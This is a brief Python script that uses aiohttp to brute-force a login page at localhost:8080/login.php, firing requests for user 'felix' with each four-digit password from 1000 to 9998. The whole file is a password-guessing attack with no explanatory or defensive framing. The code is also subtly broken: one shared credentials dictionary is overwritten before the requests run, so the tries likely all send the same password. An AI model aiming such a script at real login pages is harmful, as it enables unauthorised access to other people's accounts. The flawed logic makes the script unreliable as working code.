import asyncio
from aiohttp import ClientSession


async def scrape(creds):
    async with ClientSession() as session:
        async with session.post("http://localhost:8080/login.php", data=creds) as response:
            response = await response.read()
            print(response)

loop = asyncio.get_event_loop()

tasks = []
creds = {'user' : 'felix', 'password' : 'null'}
for i in range(1000, 9999):
    creds['password'] = str(i)
    print(i)
    task = asyncio.ensure_future(scrape(creds))
    tasks.append(task)

loop.run_until_complete(asyncio.wait(tasks))